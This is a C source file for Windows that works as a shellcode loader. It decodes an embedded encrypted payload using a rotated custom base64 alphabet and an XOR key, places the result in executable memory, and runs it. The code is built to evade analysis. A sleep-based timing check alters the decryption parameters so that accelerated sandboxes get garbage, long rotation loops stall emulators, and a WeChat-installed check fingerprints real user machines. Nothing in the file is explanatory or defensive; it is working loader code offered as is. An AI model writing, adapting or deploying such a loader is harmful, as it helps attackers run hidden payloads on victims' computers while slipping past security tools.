#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

int base64_decode(unsigned char *input, unsigned char **output, int len, char *base64_table, int base64_table_iv) {
    if (len % 4 != 0){
        len++;
    }
    for(long i = 0; i<base64_table_iv; i++){
        adjust_first_to_last(base64_table);
    }
    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;
    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return 0;
    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;
        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;
        i += 4;
    }
    return output_len;
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}

void excess_code() {
    if (is_wechat_installed() == 0) {
        printf("未通过微信检测");
    }
}

int main() {
    excess_code();
    unsigned char *decoded = NULL;
    void *exec_mem = NULL;
    unsigned char decrypted[4096];
    unsigned char shellcode[] = "zb4NIS3uN2vtkWsgA1PHGbr6UEeADZ+TccgFmQ6qBWs2ZWmFgyFh5nSj6as09sD6zLRq9pakot/X/QP0uXEAtH98r1SGO57jWbaCbSHc8mhevVe4M5btkpQbB3b0ZpaZ738xjHRi3JREdzpmA6OQ7/+vHDMEiy7ni2xrjPD8gVkZWDlzYO/E28d0uXoad0cK5V7+odpdlva0QrWPOHZGGfBso0lMZWokTmrOXLVpZB5ifbjzuVNJDJ6MCHWfuV5uG/9EdUUIvrmD//s+XnPnrdJxk9krimPytdZx5bUVlfHSZHhT0w9CrqcKjpZ8G3wLX9SekAwsbn5QerKWlBggEZOxwj5XgdZ+QGhy797Sv1HXKm7nQDOUoJmx75rWnaHIutL4/1rnR212MPQ71zmVhPDTHaJMiKliewITGNwtEfufFW2JIcJB1b2OiTUx9At4iARtLmIZiJ4cKZEdrV3PHJiWz+FrMhFSLAMHcWZqkyDto78PNXHt0Ga80qrGwYnEgsKEEI5dGLZ8g0YT4Fa4cv5xdJJ2GyDqTfC/6HN1yIZz6c1i6PA3TfQFQQ1eKqNAkxf791DQgK3jWjXob86XiGu5";
    char base64_table[] = "i78NOPrz0deftTUByMh345WmnopDEFGAg9jCXabcJKLV2uvwxYZklsHI16+/QRSq";
    char key[] = "Sqra0(3AeMhi7I1DEFGH45WmnopuvwxYZklstTU6+/QR*)jCXabcJ79!Ag9OPrB&Byz0defKLV238N";
    long base64_table_iv = 3333333;
    long key_iv = 99999999;
    clock_t start, end;
    int cpu_time_used;
    start = clock();
    Sleep(2000);
    end = clock();
    cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
    base64_table_iv = base64_table_iv + 2 - cpu_time_used;
    key_iv = key_iv + 2 - cpu_time_used;
    int shellcode_len = strlen(shellcode) - 1;
    int decoded_len = base64_decode(shellcode, &decoded, shellcode_len, base64_table, base64_table_iv);
    for(int i = shellcode_len/4*3-1; i>=0 ; i--){
        if (decoded_len <= 5) { goto exit; }
        if (decoded[i] != '\x00') {
            for(long i = 0; i<key_iv; i++){
                adjust_first_to_last(key);
            }
            exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            xor_encrypt_decrypt(decoded, decrypted, key, decoded_len);
            memcpy(exec_mem, decrypted, sizeof(decrypted));
            break;
        }
    }
    ((void(WINAPI*)(void))exec_mem)();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    exit: return 0;
}
